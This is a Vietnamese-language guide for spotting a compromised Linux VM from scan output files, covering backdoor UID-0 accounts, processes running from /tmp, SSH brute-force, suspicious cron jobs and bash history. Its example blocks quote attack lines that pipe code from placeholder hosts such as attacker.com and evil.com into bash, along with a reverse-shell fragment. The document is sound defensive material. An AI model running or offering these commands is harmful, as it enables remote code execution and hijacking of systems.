# Cách nhanh phát hiện hacker từ kết quả scan

## 🚨 **5 File QUAN TRỌNG NHẤT** (Nhìn đây trước)

### **1️⃣ `2_accounts.txt` - TÀI KHOẢN (Hacker tạo tài khoản backdoor)**
```bash
cat results/192.168.10.123/2_accounts.txt
```
**RED FLAGS (dấu hacker):**
- ❌ Có UID 0 ngoài `root` → **NGUY HIỂM** (backdoor account)
- ❌ Mật khẩu rỗng → **NGUY HIỂM**
- ❌ Tài khoản lạ không quen → kiểm tra có phải hacker tạo không
- ✅ OK nếu chỉ `root` có UID 0

**Ví dụ xấu:**
```
hacker:x:0:0::/tmp/bash    ← UID 0, shell lạ → HACKER!
```

---

### **2️⃣ `7_process.txt` - PROCESS (Mã độc chạy)**
```bash
cat results/192.168.10.123/7_process.txt | grep -A5 "Process từ /tmp"
```
**RED FLAGS:**
- 🚨 Process từ `/tmp/` hoặc `/dev/shm/` → **NGUY HIỂM** (mã độc chạy)
- 🚨 Binary xóa rồi (deleted) → **NGUY HIỂM**
- ✅ OK nếu không thấy cái này

**Ví dụ xấu:**
```
PID 12345: /tmp/miner - bitcoin_miner    ← MINER!
PID 54321: /dev/shm/.hidden (deleted)   ← MÃ ĐỘC!
```

---

### **3️⃣ `10_auth.txt` - SSH LOG (Ai đăng nhập, brute-force)**
```bash
cat results/192.168.10.123/10_auth.txt
```
**RED FLAGS:**
- 🚨 Brute-force SSH (Failed password > 100) → **BỊ TẤN CÔNG**
- 🚨 Đăng nhập từ IP lạ không quen → **NGHI VẤN**
- 🚨 Root đăng nhập SSH từ IP ngoài dải quản trị → **NGHI VẤN**
- ✅ OK nếu chỉ sysadmin đăng nhập từ IP nội bộ

**Ví dụ xấu:**
```
Accepted from 203.0.113.999 (IP ngoài)    ← LẠ!
Failed password 500 times from 1.2.3.4    ← BRUTE-FORCE!
```

---

### **4️⃣ `6_cron.txt` - CRON LẠ (Mã độc chạy tự động)**
```bash
cat results/192.168.10.123/6_cron.txt | grep -E "curl|wget|nc|python"
```
**RED FLAGS:**
- 🚨 Cron gọi `curl`, `wget`, `nc`, `ncat` → **C2 COMMAND** (kết nối attacker)
- 🚨 Cron tải và chạy script từ internet → **NGUY HIỂM**
- 🚨 Cron chạy Python một dòng (`python -c`) → **NGUY HIỂM**
- ✅ OK nếu cron chỉ chạy backup, update normal

**Ví dụ xấu:**
```
* * * * * curl http://attacker.com/cmd | bash  ← C2!
0 */6 * * * wget -O /tmp/.hide http://evil.com/miner.sh  ← MINER!
```

---

### **5️⃣ `11_bash_history.txt` - BASH HISTORY (Lệnh chạy)**
```bash
cat results/192.168.10.123/11_bash_history.txt
```
**RED FLAGS:**
- 🚨 Nhiều lệnh `curl`, `wget` tải từ internet → **HACKER TẢI MÃ ĐỘC**
- 🚨 Lệnh `nc`, `ncat`, `/dev/tcp` → **REVERSE SHELL**
- 🚨 Lệnh `chmod +x`, `bash -c` trên file `/tmp` → **CHẠY MÃ ĐỘC**
- 🚨 `base64 -d | bash` → **GIẢI MÃ HACKER**
- ✅ OK nếu chỉ normal command (ls, cd, apt-get, etc)

**Ví dụ xấu:**
```
curl http://evil.com/shell.sh | bash              ← SHELL!
wget http://attacker.cn/miner.tar.gz             ← MINER!
echo -n 'bash -i >&' | base64 -d | bash -c ...   ← REVERSE!
```

---

## 📊 **QUICK CHECK SCRIPT**

```bash
# Chạy script phân tích tự động
bash analyze_results.sh results/192.168.10.123

# Output sẽ cho Risk Score (0-100)
# Risk >= 50 = NGUY HIỂM (xâm nhập)
# Risk >= 30 = KIỂM TRA KỸ
# Risk < 10 = BÌNH THƯỜNG
```

---

## ⚡ **1 Phút Check Nhanh**

```bash
cd results/192.168.10.123

# 1. UID 0?
grep "^[^:]*:x:0:" 2_accounts.txt | grep -v "^root:"

# 2. Process từ /tmp?
grep "/tmp/\|/dev/shm/" 7_process.txt

# 3. Brute-force?
grep -c "Failed password" 10_auth.txt

# 4. Cron lạ?
grep -E "curl|wget|nc|ncat" 6_cron.txt

# 5. History lạ?
grep -E "curl |wget |nc |python.*-c" 11_bash_history.txt | head -10
```

**Nếu có cái nào không có output (empty) = ✅ OK**  
**Nếu có cái nào có output = ⚠️ Kiểm tra thêm**

---

## 🎯 **Công thức phán đoán**

| Dấu hiệu | Độ tin cậy | Hành động |
|---------|-----------|----------|
| **UID 0 ngoài root** | 100% | 🚨 Isolate VM ngay |
| **Process từ /tmp** | 95% | 🚨 Kill process, backup log |
| **Cron gọi curl/nc** | 90% | 🚨 Remove cron, check attacker |
| **Brute-force SSH** | 85% | ⚠️ Check login IP, change password |
| **History curl +10 lần** | 80% | ⚠️ Check downloaded files |
| **Bash từ /tmp** | 90% | 🚨 Kill, remove file |

---

## 📝 **Hacker thường làm gì**

1. **Tạo backdoor account** (UID 0) → Check `2_accounts.txt`
2. **Tải mã độc** (curl/wget) → Check `11_bash_history.txt`
3. **Chạy mã độc** (process /tmp) → Check `7_process.txt`
4. **Tự động chạy** (cron, systemd) → Check `6_cron.txt`, `12_persistence.txt`
5. **Kết nối attacker** (nc, C2) → Check `10_auth.txt` (IP lạ)

---

## ✅ **Nếu phát hiện hacker**

```bash
# 1. Isolate VM (ngắt mạng nếu cần)
# 2. Backup log bằng SCP để điều tra
scp -r results/192.168.10.123 your_laptop:/path/

# 3. Kill process lạ
kill -9 <PID_suspicious>

# 4. Xóa cron lạ
crontab -e
# Comment out / delete dòng lạ

# 5. Xóa file lạ
rm -f /tmp/hci_scan_*
rm -f /dev/shm/.hidden
```

---

## 💡 **Dùng analyze_results.sh**

```bash
# Setup machine (tham khảo):
cd ~/scan_hic_old/results/192.168.10.123
bash ../../analyze_results.sh .

# Output: Risk Score + warnings
```

**Done!** Bây giờ bạn có cách nhanh để phát hiện hacker! 🎯
